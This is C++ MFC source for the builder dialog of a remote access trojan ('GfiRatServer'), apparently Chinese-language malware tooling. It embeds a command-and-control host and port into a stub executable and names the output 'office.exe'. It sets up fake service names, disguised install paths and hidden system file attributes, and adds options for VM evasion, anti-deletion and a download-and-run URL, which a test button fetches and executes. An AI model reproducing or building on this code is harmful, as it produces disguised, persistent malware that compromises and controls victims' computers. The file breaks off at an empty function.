// BUID.cpp : implementation file
//


#include "pch.h"
#include "GfiRatServer.h"
#include "BUID.h"
#include "encode.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#endif

/////////////////////////////////////////////////////////////////////////////
// BUID dialog


BUID::BUID(CWnd* pParent /*=NULL*/)
	: CDialog(BUID::IDD, pParent)
{
	//{{AFX_DATA_INIT(BUID)
	m_Host = _T("192.168.50.142");
	m_Port = _T("9998");
	//	m_Port =((CGfiRatServerApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort", 8000); 
	m_Group = _T("Default");
	m_Version = _T("XhcSoft1.0");
	m_green = ((CGfiRatServerApp*)AfxGetApp())->m_IniFile.GetInt("Build", "Green1", TRUE); //��ɫ��װ
	m_green1 = ((CGfiRatServerApp*)AfxGetApp())->m_IniFile.GetInt("Build", "Green2", FALSE); //��ɫ��װ
	m_green2 = ((CGfiRatServerApp*)AfxGetApp())->m_IniFile.GetInt("Build", "Green", FALSE); //��ɫ��װ

	m_svcname = ((CGfiRatServerApp*)AfxGetApp())->m_IniFile.GetString("��������", "ServiceName", "SSDKSRV");  //��������
	m_scname = ((CGfiRatServerApp*)AfxGetApp())->m_IniFile.GetString("��������", "ServiceDisplayName", "SSDKSRV Discovery Service");  //������ʾ
	m_shelp = ((CGfiRatServerApp*)AfxGetApp())->m_IniFile.GetString("��������", "ServiceDescription", "��������ͥ�����ϵ� Booth �豸�ļ�⡣");  //��������
	m_exemeux = ((CGfiRatServerApp*)AfxGetApp())->m_IniFile.GetString("��������", "Eexmeux", "Cao360");      //���л���


	m_kbcheck = ((CGfiRatServerApp*)AfxGetApp())->m_IniFile.GetInt("Build", "KbChk", FALSE); //�Ƿ�����
	m_edit_kb = ((CGfiRatServerApp*)AfxGetApp())->m_IniFile.GetString("Build", "KbUrl", "http://www.baidu.com/1.jpg"); //�����ַ
	/*m_lanpenetrate = ((CGfiRatServerApp *)AfxGetApp())->m_IniFile.GetInt("Build", "Green1", TRUE);*/
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}


void BUID::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(BUID)
	DDX_Text(pDX, IDC_EDIT_HOST, m_Host);
	DDX_Text(pDX, IDC_EDIT_PORT, m_Port);
	DDX_Text(pDX, IDC_EDIT_GROUP, m_Group);
	DDX_Text(pDX, IDC_EDIT_VERSION, m_Version);
	DDX_Check(pDX, IDC_GREEN, m_green);
	DDX_Check(pDX, IDC_GREEN2, m_green1);
	DDX_Check(pDX, IDC_GREEN3, m_green2);

	DDX_Text(pDX, IDC_EDIT_SVCNAME, m_svcname);//��������  DDX_Control
	DDX_Text(pDX, IDC_EDIT_SCNAME, m_scname);//��ʾ����   DDX_Control
	DDX_Text(pDX, IDC_EDIT_SHELP, m_shelp);//��������   DDX_Control
	DDX_Control(pDX, IDC_COMBO_RELEASEPATH, m_releasepath);//��װ·��
	DDX_Text(pDX, IDC_DLL_NAME, m_dllname);//��װ����

	DDX_Control(pDX, IDC_FILEATTRIBUTE, m_fileattribute);

	DDX_Check(pDX, IDC_LANPENETRATE, m_lanpenetrate);//��������

	DDX_Control(pDX, IDC_FILEALEIXING, m_filealeixing);
	DDX_Text(pDX, IDC_FILEALEIXING, m_houzuiming);

	DDX_Text(pDX, IDC_EXE_MEUX, m_exemeux);

	DDX_Text(pDX, IDC_AZZDS, m_azzds);
	/////////////////
	DDX_Check(pDX, IDC_DELRTD, m_delrtd);
	DDX_Check(pDX, IDC_CHECK5, m_fvm);
	DDX_Check(pDX, IDC_ZKFSMS, m_zkfsms);
	DDX_Check(pDX, IDC_CHECK6, m_fhb);
	DDX_Check(pDX, IDC_Zjz, m_zjz);
	DDX_Check(pDX, IDC_ZKFSMSA, m_fscc);
	DDX_Text(pDX, IDC_EDIT_KB, m_edit_kb);


	DDX_Check(pDX, IDC_KBCHECK, m_kbcheck);
	DDX_Control(pDX, IDC_TEST_MASTER1, m_testBtn1);


	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(BUID, CDialog)
	//{{AFX_MSG_MAP(BUID)
	ON_BN_CLICKED(IDC_GREEN, OnGreen)
	ON_BN_CLICKED(IDC_GREEN2, OnGreen2)
	ON_BN_CLICKED(IDC_GREEN3, OnGreen3)
	ON_BN_CLICKED(IDC_RANDOM2, OnRandom2)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BMP, OnBmp)
	ON_BN_CLICKED(IDC_BTN_PATH, OnBtnPath)
	ON_BN_CLICKED(IDC_KBCHECK, OnKbCheck)
	ON_BN_CLICKED(IDC_KBTEST, OnKbTest)
	ON_BN_CLICKED(IDC_TEST_MASTER1, OnTestMaster1)
	//}}AFX_MSG_MAP
	ON_BN_CLICKED(IDOK, &BUID::OnBnClickedOk)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// BUID message handlers
BOOL BUID::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.
	CString   str = "C:\\ProgramData\\";
	GetDlgItem(IDC_COMBO_RELEASEPATH)->SetWindowText(str);
	((CComboBox*)GetDlgItem(IDC_COMBO_RELEASEPATH))->AddString("C:\\Windows\\");
	((CComboBox*)GetDlgItem(IDC_COMBO_RELEASEPATH))->AddString("C:\\ProgramData\\");
	((CComboBox*)GetDlgItem(IDC_COMBO_RELEASEPATH))->AddString("%ProgramFiles%\AppPatch\\");
	((CComboBox*)GetDlgItem(IDC_COMBO_RELEASEPATH))->AddString("%SystemRoot%\system32\\");
	((CComboBox*)GetDlgItem(IDC_COMBO_RELEASEPATH))->AddString("%ProgramFiles%\StormII\\");
	((CComboBox*)GetDlgItem(IDC_COMBO_RELEASEPATH))->AddString("%ALLUSERSPROFILE%\\Application Data\\Storm\\update\\");
	((CComboBox*)GetDlgItem(IDC_COMBO_RELEASEPATH))->AddString("%ProgramFiles%\\Google\\");
	((CComboBox*)GetDlgItem(IDC_COMBO_RELEASEPATH))->AddString("%ALLUSERSPROFILE%\Application Data\DRM\\");
	((CComboBox*)GetDlgItem(IDC_COMBO_RELEASEPATH))->AddString("%ALLUSERSPROFILE%\Application Data\Microsoft.NET\\");
	((CComboBox*)GetDlgItem(IDC_COMBO_RELEASEPATH))->AddString("%ProgramFiles%\NetMeeting\\");



	CString   str1 = "Cao360";
	GetDlgItem(IDC_EXE_MEUX)->SetWindowText(str1);
	CString   str2 = "����+ϵͳ+ֻ��";
	GetDlgItem(IDC_FILEATTRIBUTE)->SetWindowText(str2);



	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDD_ABOUTBOX);//IDS_ABOUTBOX
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDD_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon


	OnRandom2();


	if (((CButton*)GetDlgItem(IDC_GREEN))->GetCheck() == TRUE)
	{
		GetDlgItem(IDC_EDIT_SVCNAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SCNAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SHELP)->EnableWindow(FALSE);
		GetDlgItem(IDC_COMBO_RELEASEPATH)->EnableWindow(FALSE);
		GetDlgItem(IDC_DLL_NAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_FILEATTRIBUTE)->EnableWindow(FALSE);
		GetDlgItem(IDC_EXE_MEUX)->EnableWindow(FALSE);
		GetDlgItem(IDC_AZZDS)->EnableWindow(FALSE);
	}



	// TODO: Add extra initialization here

	return TRUE;  // return TRUE  unless you set the focus to a control
}

void BUID::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDD_ABOUTBOX)
	{
		BUID dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}
void BUID::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM)dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}
HCURSOR BUID::OnQueryDragIcon()
{
	return (HCURSOR)m_hIcon;
}
struct DAN_DATA
{
	TCHAR szDns[300];		//���ߵ�ַ
	TCHAR dwPort[32];		//���߶˿�
	TCHAR szGroup[50];		//���߷���
	TCHAR szVersion[32];	//���߰汾
	TCHAR szGetGroup[256];	//����Ψһ��ʶ
	BOOL  bRunOnce;         //�Ƿ�Ϊ��ɫ��װ
	BOOL  bRuns;            //�Ƿ�������Ŀ¼����
	BOOL  bService;         //�Ƿ��Ƿ�������
	TCHAR SerName[100];     //��������
	TCHAR Serdisplay[128];  //��ʾ����
	TCHAR Serdesc[256];     //��������
	TCHAR ReleasePath[100]; //��װ;��
	TCHAR ReleaseName[50];  //��װ����
	WORD FileAttribute;      //�ļ�����
	BOOL  bLanPenetrate;    //��������
	CHAR Mexi[100];          //���л���
	WORD  Dele_zd;          //��װ����
	BOOL Dele_te;            //��װ��ɾ��
	BOOL Fvm;            //vm
	BOOL Dele_fs;            //ռ�ӷ�ɾ����װ
	BOOL Fhb;           //����
	BOOL Zjz;
	BOOL fsc;
	CHAR szDownRun[512];   //�������е�ַ
};
DAN_DATA dan_data =
{
	"           D         ",
		"",
		"",
		"",
		"",
		TRUE,			//TRUEΪ��ɫ��װ��FALSEΪ��׼��װ
		TRUE,			//TRUEΪ����Ŀ¼����
		TRUE,			//TRUEΪ��������
		"",
		"",
		"",
		"",
		"",
		FILE_ATTRIBUTE_NORMAL,    //�ļ�����
		FALSE,
		"Cao360",
		0,
		FALSE,
		FALSE,
		FALSE,
		FALSE,
		FALSE,
		FALSE,
		"",
};
int memfind(const char* mem, const char* str, int sizem, int sizes)
{
	int   da, i, j;
	if (sizes == 0) da = strlen(str);
	else da = sizes;
	for (i = 0; i < sizem; i++)
	{
		for (j = 0; j < da; j++)
			if (mem[i + j] != str[j])	break;
		if (j == da) return i;
	}
	return -1;
}
void BUID::OnOK()
{
	// TODO: Add extra validation here
	UpdateData(TRUE);
	CString strSer, strSerDis, strSerDes, strReleasepath, strDllName;
	GetDlgItem(IDC_EDIT_SVCNAME)->GetWindowText(strSer);//��������
	GetDlgItem(IDC_EDIT_SCNAME)->GetWindowText(strSerDis);//��ʾ����
	GetDlgItem(IDC_EDIT_SHELP)->GetWindowText(strSerDes);//��������
	GetDlgItem(IDC_COMBO_RELEASEPATH)->GetWindowText(strReleasepath);//��װ;��
	GetDlgItem(IDC_DLL_NAME)->GetWindowText(strDllName);//��װ����


	char DatPath[MAX_PATH] = { 0 };
	GetModuleFileName(NULL, DatPath, sizeof(DatPath));
	*strrchr(DatPath, '\\') = '\0';
	lstrcat(DatPath, "\\Cache\\Loader.dat");

	strcpy(dan_data.szDns, MyEncode(m_Host.GetBuffer(0)));
	strcpy(dan_data.dwPort, MyEncode(m_Port.GetBuffer(0)));
	strcpy(dan_data.szGroup, MyEncode(m_Group.GetBuffer(0)));
	strcpy(dan_data.szVersion, MyEncode(m_Version.GetBuffer(0)));
	if (((CButton*)GetDlgItem(IDC_GREEN))->GetCheck()) //��ɫ����
	{
		dan_data.bRunOnce = 1;//��ɫ����
	//	MessageBox("1");
	}
	else
	{
		dan_data.bRunOnce = 2;//��ɫ����
	//	MessageBox("2");
	}
	if (((CButton*)GetDlgItem(IDC_GREEN2))->GetCheck()) //����Ŀ¼����  ����uac
	{
		dan_data.bRuns = 1;//����Ŀ¼����  ����uac
	//	MessageBox("1");
	}
	else
	{
		dan_data.bRuns = 2;//����Ŀ¼����  ����uac
	//	MessageBox("2");
	}
	if (((CButton*)GetDlgItem(IDC_GREEN3))->GetCheck()) //������������  ���޸���
	{
		dan_data.bService = 1;//������������  ���޸���
	//	MessageBox("1");
	}
	else
	{
		dan_data.bService = 2;//������������  ���޸���
	//	MessageBox("2");
	}
	// 	dan_data.bRunOnce = m_green;
	// 	dan_data.bRuns = m_green1;
	// 	dan_data.bService = m_green2;
	strcpy(dan_data.SerName, strSer.GetBuffer(0));//��������
	strcpy(dan_data.Serdisplay, strSerDis.GetBuffer(0));//��ʾ����
	strcpy(dan_data.Serdesc, strSerDes.GetBuffer(0)); //��������
	strcpy(dan_data.ReleasePath, strReleasepath.GetBuffer(0));   //д�밲װ·��
	strcpy(dan_data.ReleaseName, (strDllName + m_houzuiming).GetBuffer(0));   //д�밲װ����
	CString szTemp;

	GetDlgItemText(IDC_FILEATTRIBUTE, szTemp);

	if (szTemp == "����")
		dan_data.FileAttribute = FILE_ATTRIBUTE_NORMAL;
	if (szTemp == "����")
		dan_data.FileAttribute = FILE_ATTRIBUTE_HIDDEN;

	if (szTemp == "ϵͳ")
		dan_data.FileAttribute = FILE_ATTRIBUTE_SYSTEM;

	if (szTemp == "ֻ��")
		dan_data.FileAttribute = FILE_ATTRIBUTE_READONLY;

	if (szTemp == "����+ϵͳ")
		dan_data.FileAttribute = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;

	if (szTemp == "����+ϵͳ+ֻ��")
		dan_data.FileAttribute = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY;


	if (((CButton*)GetDlgItem(IDC_LANPENETRATE))->GetCheck()) //��������
	{
		//ִ�����A
		dan_data.bLanPenetrate = 1;//��������
	//	MessageBox("1");
	}
	else
	{
		dan_data.bLanPenetrate = 2;//��������
	//	MessageBox("2");
	}
	// 	if (!m_lanpenetrate == FALSE)
	// 	{
	// 		dan_data.bLanPenetrate = m_lanpenetrate;
	// 	}
	// 	else
	// 	{
	// 		dan_data.bLanPenetrate = m_lanpenetrate;
	// 	}



	strcpy(dan_data.Mexi, m_exemeux.GetBuffer(0));          //д�����л���

	dan_data.Dele_zd = (WORD)m_azzds;    //��װ����

//////////////////////////////////////////////////////////////////////////
	if (((CButton*)GetDlgItem(IDC_DELRTD))->GetCheck()) //��ɾ��
	{
		//ִ�����A
		dan_data.Dele_te = 1;  //��װ��ɾ��
	}
	else
	{
		dan_data.Dele_te = 2;  //��װ��ɾ��;
	}
	if (((CButton*)GetDlgItem(IDC_CHECK5))->GetCheck()) //�������
	{
		//ִ�����A
		dan_data.Fvm = 1;  //�������
	}
	else
	{
		dan_data.Fvm = 2;  //�������
	}
	if (((CButton*)GetDlgItem(IDC_ZKFSMS))->GetCheck()) //������
	{
		//ִ�����A
		dan_data.Dele_fs = 1;  //������
	}
	else
	{
		dan_data.Dele_fs = 2;  //������
	}
	if (((CButton*)GetDlgItem(IDC_CHECK6))->GetCheck()) //������
	{
		//ִ�����A
		dan_data.Fhb = 1;  //������
	}
	else
	{
		dan_data.Fhb = 2;  //������
	}
	if (((CButton*)GetDlgItem(IDC_Zjz))->GetCheck()) //K�ս���
	{
		//ִ�����A
		dan_data.Zjz = 1;//K�ս���
	}
	else
	{
		dan_data.Zjz = 2;//K�ս���
	}
	if (((CButton*)GetDlgItem(IDC_ZKFSMSA))->GetCheck()) //360���ϴ�
	{
		//ִ�����A
		dan_data.fsc = 1;  //��360�ϴ�
	}
	else
	{
		dan_data.fsc = 2;  //��360�ϴ�
	}
	if (!m_edit_kb.IsEmpty() && m_kbcheck)
	{
		strcpy(dan_data.szDownRun, m_edit_kb.GetBuffer(0));
	}
	/*	if (!m_delrtd == FALSE)
		{
			MessageBox("��װ��ɾ��");
			dan_data.Dele_te = 1;  //��װ��ɾ��
		}
		if (!m_fvm == FALSE)//vm
		{
			MessageBox("vm");
			dan_data.Fvm = 1;  //vm
		}
		if (!m_zkfsms == FALSE)
		{
			MessageBox("������");
			dan_data.Dele_fs = 1;  //������
		}
		if (!m_fhb == FALSE)
		{
			MessageBox("HB");
			dan_data.Fhb = 1;  //hb
		}
		if (!m_zjz == FALSE)
		{
			MessageBox("K�ս���");
			dan_data.Zjz=1;//K�ս���
		}
		if (!m_fscc == FALSE)
		{
			MessageBox("��360�ϴ�");
			dan_data.fsc = 1;  //��360�ϴ�
		}
		*/
		//////////////////////////////////////////////////////////////////////////

		/*
				char Buffer[MAX_PATH]={0};
				GetModuleFileName(NULL, Buffer, MAX_PATH);
				*strrchr(Buffer,'\\')=0;//ɾ���ļ�����ֻ���·��
				strcat(Buffer,"\\С��\\");
				CreateDirectory(Buffer, NULL);
				*/

	char szFilePath[MAX_PATH] = { 0 };
	CFileDialog dlg(FALSE, "exe", "office.exe", OFN_OVERWRITEPROMPT, "��ִ���ļ�|*.exe", NULL);
	if (dlg.DoModal() != IDOK)
		return;
	wsprintf(szFilePath, "%s%s", dlg.GetPathName()/*Buffer*/, "");
	DeleteFile(szFilePath);
	CopyFile(DatPath, szFilePath, FALSE);




	DWORD wr = 0;
	HANDLE hFile = CreateFile(szFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD len = GetFileSize(hFile, NULL);
	char* str = new char[len];
	ZeroMemory(str, sizeof(str));
	ReadFile(hFile, str, len + 1, &wr, NULL);

	CloseHandle(hFile);
	DWORD dwOffset = memfind(str, "           D         ", len, 0);
	if (dwOffset == -1)
	{
		AfxMessageBox("�����ļ���ռ�û��ļ����Ϸ�!");
		return;
	}
	CFile file;
	if (file.Open(szFilePath, CFile::modeCreate | CFile::modeWrite | CFile::modeRead | CFile::typeBinary))
	{
		try
		{
			file.Write(str, len);
			file.Seek(dwOffset, CFile::begin);
			file.Write((char*)&dan_data, sizeof(DAN_DATA));
			//////////////////////////////////�滻MZͷ//////////////////////////////////
			//  			file.SeekToBegin();//���ļ��ĵ�һ���Լ���ʼд������
			//  			file.Write("SB", lstrlen("SB"));//��mz�滻��SB
			//////////////////////////////////�滻MZͷ//////////////////////////////////
			file.Close();
		}
		catch (...)
		{
			file.Close();
			MessageBox("�ļ�����ʧ�ܣ�����", "��ʾ", MB_OK | MB_ICONSTOP);
			DeleteFile(szFilePath);
			return;
		}
	}
	file.Close();

	MessageBox("���ɳɹ�!", "��ʾ");
}
void BUID::OnBmp()
{
	CFileDialog dlg(TRUE, NULL, NULL, OFN_OVERWRITEPROMPT | 0x10000000, "bmp|*.bmp|jpg|*.jpg|All Files(*.*)|*.*|", NULL);
	char Buffer[MAX_PATH] = { 0 };
	GetModuleFileName(NULL, Buffer, MAX_PATH);
	*strrchr(Buffer, '\\') = 0;//ɾ���ļ�����ֻ���·��
	strcat(Buffer, "\\dantupian\\");
	CreateDirectory(Buffer, NULL);

	if (dlg.DoModal() != IDOK)
	{
		CloseHandle(dlg);
		return;
	}
	char szFilePath[MAX_PATH] = { 0 };
	wsprintf(szFilePath, "%s%s", Buffer, "baby.bmp");
	DeleteFile(szFilePath);
	if (CopyFile(dlg.GetPathName(), szFilePath, FALSE))
	{
		SetFileAttributes(szFilePath, FILE_ATTRIBUTE_HIDDEN);//�����ļ�
		AfxMessageBox("�ɹ�!");
	}
	else AfxMessageBox("����ʧ��!");
}

void BUID::OnGreen()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	GetDlgItem(IDC_EDIT_SVCNAME)->EnableWindow(FALSE);
	GetDlgItem(IDC_EDIT_SCNAME)->EnableWindow(FALSE);
	GetDlgItem(IDC_EDIT_SHELP)->EnableWindow(FALSE);
	GetDlgItem(IDC_COMBO_RELEASEPATH)->EnableWindow(FALSE);
	GetDlgItem(IDC_DLL_NAME)->EnableWindow(FALSE);
	GetDlgItem(IDC_FILEATTRIBUTE)->EnableWindow(FALSE);
	GetDlgItem(IDC_EXE_MEUX)->EnableWindow(FALSE);
	GetDlgItem(IDC_AZZDS)->EnableWindow(FALSE);
	GetDlgItem(IDC_LANPENETRATE)->EnableWindow(TRUE);
}

void BUID::OnGreen2()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	GetDlgItem(IDC_EDIT_SVCNAME)->EnableWindow(FALSE);
	GetDlgItem(IDC_EDIT_SCNAME)->EnableWindow(FALSE);
	GetDlgItem(IDC_EDIT_SHELP)->EnableWindow(FALSE);
	GetDlgItem(IDC_COMBO_RELEASEPATH)->EnableWindow(FALSE);
	GetDlgItem(IDC_DLL_NAME)->EnableWindow(TRUE);
	GetDlgItem(IDC_FILEATTRIBUTE)->EnableWindow(FALSE);
	GetDlgItem(IDC_EXE_MEUX)->EnableWindow(FALSE);
	GetDlgItem(IDC_AZZDS)->EnableWindow(FALSE);
	GetDlgItem(IDC_LANPENETRATE)->EnableWindow(FALSE);
}

void BUID::OnGreen3()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	GetDlgItem(IDC_EDIT_SVCNAME)->EnableWindow(TRUE);
	GetDlgItem(IDC_EDIT_SCNAME)->EnableWindow(TRUE);
	GetDlgItem(IDC_EDIT_SHELP)->EnableWindow(TRUE);
	GetDlgItem(IDC_COMBO_RELEASEPATH)->EnableWindow(TRUE);
	GetDlgItem(IDC_DLL_NAME)->EnableWindow(TRUE);
	GetDlgItem(IDC_FILEATTRIBUTE)->EnableWindow(TRUE);
	GetDlgItem(IDC_EXE_MEUX)->EnableWindow(TRUE);
	GetDlgItem(IDC_AZZDS)->EnableWindow(TRUE);
	GetDlgItem(IDC_LANPENETRATE)->EnableWindow(FALSE);

}
int StormRand(int count)
{
	unsigned long Time = GetTickCount();
	int seed = rand() + 3;
	seed = (seed * Time) % count;
	return seed;
}
void my_stormRands(BOOL ds, CHAR Number, CHAR Data[], CHAR Low, CHAR High)
{
	CHAR str[2];
	if (ds)
		str[0] = 'a';
	else
		str[0] = 'A';

	Sleep(StormRand(10));
	for (int i = 0; i < Number; i++)
	{
		//	    Sleep(StormRand(10));
		if (i == Low || i == High)
		{
			Data[i] = ' ';
			i++;
			Data[i] = str[0] + StormRand(26);
			continue;
		}
		if (i == 0)
		{
			Data[i] = 'A' + StormRand(26);
		}
		else
		{
			Data[i] = str[0] + StormRand(26);
		}
	}
}
void BUID::OnRandom2()
{
	// TODO: Add your control notification handler code here
	CHAR ServerName[30] = { NULL };
	ZeroMemory(ServerName, 30);

	my_stormRands(TRUE, 15, ServerName, 6, 15);  //Microsoft
	ServerName[0] = 'R';
	ServerName[1] = 's';
	SetDlgItemText(IDC_EDIT_SVCNAME, ServerName);


	// 		if(m_gdtj)  
	// 		{
	// 			//���;��
	// 			CHAR ServerPath[30]={NULL};
	// 			ZeroMemory(ServerPath,30);
	// 			my_stormRands(TRUE,6,ServerPath,6,6);
	// 			m_remote_path.SetCurSel(1);
	// 			CString szShow;
	// 			GetDlgItemText(IDC_COMBO_RELEASEPATH,szShow);
	// 			szShow=szShow+"Microsoft "+ServerPath;
	// 			SetDlgItemText(IDC_COMBO_RELEASEPATH,szShow);
	// 		}

	if (m_green2)
	{
		CHAR DisplayName[30] = { NULL };
		ZeroMemory(DisplayName, 30);
		my_stormRands(TRUE, 15, DisplayName, 6, 15);  //Microsoft
		SetDlgItemText(IDC_EDIT_SCNAME, DisplayName);

		//�����������
		CHAR Description[30] = { NULL };
		ZeroMemory(Description, 30);
		my_stormRands(TRUE, 25, Description, 6, 25);  //Microsoft
		SetDlgItemText(IDC_EDIT_SHELP, Description);
	}

	CHAR szTemp[30] = { NULL };
	my_stormRands(TRUE, 7, szTemp, 7, 15);

	CString	WJ_Name = szTemp;
	SetDlgItemText(IDC_DLL_NAME, WJ_Name/*+".exe"*/);   //�ļ���


// 	if(m_meux)
// 	{
// 		CHAR szMeux[50]={NULL};
// 		my_stormRands(TRUE,15,szMeux,6,15);
// 		SetDlgItemText(IDC_EXE_MEUX,szMeux);   //������
// 	}

	CTime time = CTime::GetCurrentTime(); ///����CTime���� 
	CString SVTime = time.Format("%Y%m%d");  //��ȡ��ǰ���� Ϊ����汾

	SVTime = SVTime.Right(8);  //��ȡ��6λ��
	SetDlgItemText(IDC_EDIT_VERSION, "V_" + SVTime);   //����汾

	UpdateData(TRUE);
}

void BUID::OnBtnPath()
{
	// TODO: Add your control notification handler code here
	MessageBox("�ļ���װ����·�����б��е�·��Ϊ��\n1. %SystemRoot%\\system32\\,��C:\\WINDOWS\\system32\\\n2. %ProgramFiles%\\StormII\\,��C:\\Program Files\\StormII\\\n3. %ALLUSERSPROFILE%\\Application Data\\Storm\\update\\,��C:\\Documents and Settings\\All Users\\Application Data\\Storm\\update\\\n4. %ProgramFiles%\\Google\\,��C:\\Program Files\\Google\\\n5. %ProgramFiles%\\NetMeeting\\,��C:\\Program Files\\NetMeeting\\\n6. %ALLUSERSPROFILE%\\Application Data\\DRM\\,��C:\\Documents and Settings\\All Users\\Application Data\\DRM\\\n7. %ProgramFiles%\\AppPatch\\,��C:\\Program Files\\AppPatch\\\n8. %ALLUSERSPROFILE%\\Application Data\\Microsoft.NET\\,��C:\\Documents and Settings\\All Users\\Application Data\\Microsoft.NET\\\n���Լ������Զ���·�����������а��������������100�ֽڣ�\n�趨��·�������ڻ᳢�Դ���������ʧ�ܲ�������!\n9.�ļ�����֧��jpg,png,pif,msc,bat,gif,exe��!", "��װ·��", MB_ICONINFORMATION);
}
void BUID::OnKbCheck()
{
	UpdateData(TRUE);
	// TODO: Add your control notification handler code here
	if (m_kbcheck)
	{
		GetDlgItem(IDC_EDIT_KB)->EnableWindow(TRUE);
		GetDlgItem(IDC_KBTEST)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDC_EDIT_KB)->EnableWindow(FALSE);
		GetDlgItem(IDC_KBTEST)->EnableWindow(FALSE);
	}
}
bool OpenFile1(LPCTSTR lpFile, INT nShowCmd)
{
	char	lpSubKey[512];
	HKEY	hKey;
	char	strTemp[MAX_PATH];
	LONG	nSize = sizeof(strTemp);
	char* lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));

	const char* lpExt = strrchr(lpFile, '.');
	if (lpExt == NULL)
		return false;

	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
		return false;
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);

	memset(lpSubKey, 0, sizeof(lpSubKey));
	sprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
		return false;
	memset(strTemp, 0, sizeof(strTemp));
	nSize = sizeof(strTemp);
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);

	lpstrCat = strstr(strTemp, "\"%1");
	if (lpstrCat == NULL)
		lpstrCat = strstr(strTemp, "%1");

	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, " ");
		lstrcat(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = "WinSta0\\Default";

	if (!CreateProcess(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi))
		return false;
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	return true;
}

BOOL CheckFileExist(LPCTSTR lpszPath)
{
	if (GetFileAttributes(lpszPath) == 0xFFFFFFFF && GetLastError() == ERROR_FILE_NOT_FOUND)
		return FALSE;
	else
		return TRUE;
}
void BUID::OnKbTest()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);

	char* lpUrl = NULL;
	char* lpFileName = NULL;
	char szFilePath[MAX_PATH] = { 0 };

	if (m_edit_kb.GetLength() == 0)
	{
		AfxMessageBox("�ļ���ַΪ�գ��������ļ������ַ");
		return;
	}

	lpUrl = m_edit_kb.GetBuffer(0);
	lpFileName = strrchr(lpUrl, '/');
	if (lpFileName == NULL)
	{
		AfxMessageBox("�޷���ȡ�ļ������ַ�е��ļ���");
		return;
	}

	GetTempPath(sizeof(szFilePath), szFilePath);
	strcat(szFilePath, ++lpFileName);

	HRESULT hr = URLDownloadToFile(NULL, lpUrl, szFilePath, 0, NULL);
	if (hr == S_OK)
	{
		if (!CheckFileExist(szFilePath))
		{
			AfxMessageBox("�ļ����سɹ��������ļ������ڣ��ܿ��ܱ�ɱ�������ɱ�����ļ�������");
			return;
		}
	}
	else if (hr == INET_E_DOWNLOAD_FAILURE)
	{
		AfxMessageBox("URL��ַ����ȷ���ļ�����ʧ��");
		return; //URL��ַ����ȷ���ļ�����ʧ��
	}
	else
	{
		AfxMessageBox("�ļ�����ʧ�ܣ�����URL�Ƿ���ȷ");
		return; //�ļ�����ʧ�ܣ�����URL�Ƿ���ȷ
	}
	OpenFile1(szFilePath, SW_SHOW);
	//ShellExecute(NULL, "open", szFilePath, NULL, NULL, SW_SHOW);
}
DWORD WINAPI BUID::TestMaster(LPVOID lparam)
{
